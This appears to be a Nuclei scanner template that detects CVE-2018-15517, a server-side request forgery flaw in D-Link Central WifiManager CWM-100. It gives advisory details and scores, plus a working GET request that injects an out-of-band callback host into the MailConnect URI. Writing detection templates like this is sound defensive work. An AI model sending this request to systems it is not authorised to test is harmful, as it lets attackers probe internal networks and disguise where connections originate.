id: CVE-2018-15517

info:
  name: D-Link Central WifiManager - Server-Side Request Forgery
  author: gy741
  severity: high
  description: D-Link Central WifiManager is susceptible to server-side request forgery. The MailConnect feature on D-Link Central WiFiManager CWM-100 1.03 r0098 devices is intended to check a connection to an SMTP server but actually allows outbound TCP to any port on any IP address, as demonstrated by an index.php/System/MailConnect/host/127.0.0.1/port/22/secure/ URI. This can undermine accountability of where scan or connections actually came from and or bypass the FW etc. This can be automated via script or using a browser.
  impact: |
    Successful exploitation of this vulnerability could lead to unauthorized access to internal resources, data leakage, and potential compromise of the entire network.
  remediation: |
    Apply the latest security patches or updates provided by D-Link to fix the SSRF vulnerability in Central WifiManager.
  reference:
    - http://hyp3rlinx.altervista.org/advisories/DLINK-CENTRAL-WIFI-MANAGER-CWM-100-SERVER-SIDE-REQUEST-FORGERY.txt
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15517
    - http://seclists.org/fulldisclosure/2018/Nov/28
    - http://packetstormsecurity.com/files/150243/D-LINK-Central-WifiManager-CWM-100-1.03-r0098-Server-Side-Request-Forgery.html
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N
    cvss-score: 8.6
    cve-id: CVE-2018-15517
    cwe-id: CWE-918
    epss-score: 0.7459
    epss-percentile: 0.98819
    cpe: cpe:2.3:a:dlink:central_wifimanager:1.03:r0098:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: dlink
    product: central_wifimanager
  tags: cve,cve2018,seclists,packetstorm,dlink,ssrf,oast,vkev

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php/System/MailConnect/host/{{interactsh-url}}/port/80/secure/"

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"
# digest: 4a0a00473045022068bb13d14133f0d12ca880432eddae922b19789874271987373a3a3b9d4d9686022100d56ce27f15dfb666b1cba3697718c0db34d3d14a5f589e019e99a86bd90d64d9:922c64590222798bb761d5b6d8e72950